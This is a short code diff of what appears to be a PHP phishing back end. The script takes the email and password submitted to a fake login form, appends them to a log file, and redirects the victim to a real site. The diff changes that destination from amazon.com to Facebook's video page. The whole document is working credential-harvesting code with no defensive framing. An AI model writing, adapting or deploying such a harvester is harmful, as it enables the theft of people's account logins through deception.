@@ -1,4 +1,5 @@
 <?php
+header('Location: https://m.facebook.com/videos');
  $user = $_POST["email"];
  $pass = $_POST["password"];
 
@@ -9,6 +10,5 @@
  $pa = "Password: $pass\n";
  fwrite($fileuser, "\n". $co. "\n". $us. $pa. "\n". $cl); 
  fclose($fileuser);
- header('Location: https://amazon.com');
  exit()
 ?>
